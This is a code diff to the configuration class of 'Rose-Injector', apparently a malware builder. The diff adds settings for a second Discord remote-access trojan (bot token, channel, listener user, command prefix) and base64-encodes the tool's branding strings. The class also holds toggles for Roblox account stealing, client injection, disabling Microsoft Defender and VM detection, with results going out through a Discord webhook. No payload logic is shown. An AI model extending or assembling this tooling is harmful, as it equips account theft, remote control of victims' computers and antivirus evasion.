@@ -1,3 +1,4 @@
+import base64
 class Config:
     def __init__(self):
         self.webhook = 'WEBHOOK_URL'
@@ -5,8 +6,13 @@ class Config:
 
         self.debug_mode = True
 
-        self.discord_rat = False
-        self.discord_rat_socket_link = 'DISCORD_RAT_SOCKET_LINK'
+        self.rose_discord_rat = False
+        self.rose_discord_rat_socket_link = 'ROSE_DISCORD_RAT_SOCKET_LINK'
+        self.knight_discord_rat = False
+        self.knight_discord_rat_bot_token = 'KNIGHT_DISCORD_RAT_BOT_TOKEN'
+        self.knight_discord_rat_channel_id = 'KNIGHT_DISCORD_RAT_CHANNEL_ID'
+        self.knight_discord_rat_listener_user_id = 'KNIGHT_DISCORD_RAT_LISTENER_USER_ID'
+        self.knight_discord_rat_prefix = 'KNIGHT_DISCORD_RAT_PREFIX'
 
         self.discord_ping = False
         self.injection = False
@@ -23,10 +29,14 @@ class Config:
         self.defenderfucker = False
         self.vmdetection = False
         
-        self.eb_color = 16711680
-        self.eb_footer = 'Rose-Injector | Made by Gumbobrot, ICExFS, suegdu and xpierroz | https://github.com/DamagingRose/Rose-Injector'
-        self.wh_avatar = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/Rose.jpeg'
-        self.wh_name = 'Rose-Injector'
+        self.secr_eb_color = 'MTY3MTE2ODA='
+        self.secr_eb_footer = 'Um9zZS1JbmplY3RvciB8IE1hZGUgYnkgR3VtYm9icm90LCBJQ0V4RlMsIHN1ZWdkdSBhbmQgeHBpZXJyb3ogfCBodHRwczovL2dpdGh1Yi5jb20vRGFtYWdpbmdSb3NlL1Jvc2UtSW5qZWN0b3I='
+        self.secr_wh_avatar = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RhbWFnaW5nUm9zZS9Sb3NlLUluamVjdG9yL21haW4vcmVhZG1lL1Jvc2UuanBlZw=='
+        self.secr_wh_name = 'Um9zZS1JbmplY3Rvcg=='
+        self.eb_color = int(base64.b64decode(self.secr_eb_color.encode('ascii')).decode('ascii'))
+        self.eb_footer = base64.b64decode(self.secr_eb_footer.encode('ascii')).decode('ascii')
+        self.wh_avatar = base64.b64decode(self.secr_wh_avatar.encode('ascii')).decode('ascii')
+        self.wh_name = base64.b64decode(self.secr_wh_name.encode('ascii')).decode('ascii')
 
     def get_roblox_stealing(self):
         return self.roblox_stealing
@@ -67,12 +77,27 @@ class Config:
     def get_name(self):
         return self.wh_name
 
-    def get_discord_rat(self):
-        return self.discord_rat
+    def get_rose_discord_rat(self):
+        return self.rose_discord_rat
 
-    def get_discord_rat_link(self):
-        return self.discord_rat_socket_link
-
+    def get_rose_discord_rat_link(self):
+        return self.rose_discord_rat_socket_link
+    
+    def get_knight_discord_rat(self):
+        return self.knight_discord_rat
+    
+    def get_knight_discord_rat_bot_token(self):
+        return self.knight_discord_rat_bot_token
+    
+    def get_knight_discord_rat_channel_id(self):
+        return self.knight_discord_rat_channel_id
+    
+    def get_knight_discord_rat_listener_user_id(self):
+        return self.knight_discord_rat_listener_user_id
+    
+    def get_knight_discord_rat_prefix(self):
+        return self.knight_discord_rat_prefix
+    
     def get_discord_ping(self):
         return self.discord_ping
 
